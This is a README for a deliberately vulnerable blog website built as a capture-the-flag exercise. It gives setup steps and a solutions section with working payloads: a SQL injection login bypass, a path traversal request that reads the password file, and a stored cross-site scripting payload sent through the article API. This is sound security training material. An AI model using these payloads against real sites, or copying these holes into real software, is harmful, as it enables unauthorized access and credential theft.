# Vulnerable dummy website

This is a dummy website meant to be a CTF target.

## CTF scenario

A friend of yours who is learning web development asked you to help him test his simple blog website.
You discover that there are security vulnerabilities in his website.

**To complete the challenge, you have to**:
1. Log in as `admin` (easy)
2. Get the admin password (medium)
3. (*Require **2***) Publish an article which popup something when a user accesses the home page (hard)

## Installation

### Prerequisites

- A [Rust](https://rust-lang.org/) (minimum edition 2021) toolchain
  - [Cargo](https://doc.rust-lang.org/stable/cargo/)
- A software to manage [SQLite](https://sqlite.org/) databases

### Steps

1. Clone the repository
2. Create a `passwd` file and fill it with some password (make sure there is no whitespace after the text)
3. Create a SQLite database in the server directory (either name it `db.sqlite` or change the name in `Rocket.toml`), and run the following query on it:
```sql
CREATE TABLE "users" (
  "username"  TEXT  NOT NULL UNIQUE,
  "password"  TEXT  NOT NULL,
  PRIMARY KEY("username")
)
```
4. Start the web server with `cargo run --release`
5. Go to http://localhost:8080/sign and register the `admin` user with the same password as in `passwd`
6. Log out and you are ready to go !

## CTF solutions

> ⚠️ **This section contains the solutions to the challenge.**
> Take care not to read it if you want to do the challenge yourself !

### 1. Log in as `admin`

The login form is vulnerable to **SQL injection**.
So you can log in with something like:
```
Username: admin';--
Password: admin
```

### 2. Get the admin password

The admin password is located in the `passwd` file.

The `GET /article?file` endpoint is vulnerable to **path traversal**.
So you can get the file by requesting:
```
GET /article?file=../../passwd
```

### 3. Publish an article which popup something when a user accesses the home page

The `POST /api/article` endpoint is vulnerable to **DOM injection**, but we need a [Basic authentication scheme](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization#basic_authentication) to use the request.
So you can create an article by requesting:
```
POST /api/article
Authorization: Basic <auth>
Content-Type: application/json

{
  "file": "vulnerable",
  "title": "<iframe src=\"javascript:alert('I am vulnerable')\">",
  "content": ""
}
```
where `<auth>` is the base64 representation of the string `admin:<passwd>` (`<passwd>` is the text you obtained in the previous task).

> You can convert a string into base64 using JavaScript's [`btoa`](https://developer.mozilla.org/en-US/docs/Web/API/btoa) function for example.

Now, whenever a user goes to the home page, an alert saying `I am vulnerable` pops up.
